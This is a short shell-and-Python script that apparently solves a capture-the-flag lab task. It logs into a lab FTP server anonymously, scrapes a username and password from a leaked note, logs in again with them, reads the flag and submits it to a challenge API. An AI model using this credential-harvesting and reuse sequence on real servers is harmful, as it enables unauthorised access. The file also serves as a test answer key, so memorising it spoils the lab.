#!/bin/sh
set -eu

python3 - <<'PY'
from ftplib import FTP
import json
import re
import subprocess

host = "172.20.0.141"
ftp = FTP()
ftp.connect(host, 2121, timeout=5)
ftp.login("anonymous", "student@lab")

note_parts = []
ftp.retrbinary("RETR relay-note.txt", note_parts.append)
note = b"".join(note_parts).decode("utf-8")
username = re.search(r"^username=(.+)$", note, re.MULTILINE).group(1).strip()
password = re.search(r"^password=(.+)$", note, re.MULTILINE).group(1).strip()

ftp.quit()
ftp = FTP()
ftp.connect(host, 2121, timeout=5)
ftp.login(username, password)
flag_parts = []
ftp.retrbinary("RETR dispatch.txt", flag_parts.append)
flag = b"".join(flag_parts).decode("utf-8").strip()
ftp.quit()

payload = json.dumps({
    "challenge_id": "scl-challenge-frame-fcfea4",
    "task_id": "task1",
    "flag": flag,
})
subprocess.run([
    "curl", "-s", "http://172.20.0.3/api/challenges/submit",
    "-X", "POST",
    "-H", "Content-Type: application/json",
    "--data-binary", payload,
], check=True)
PY
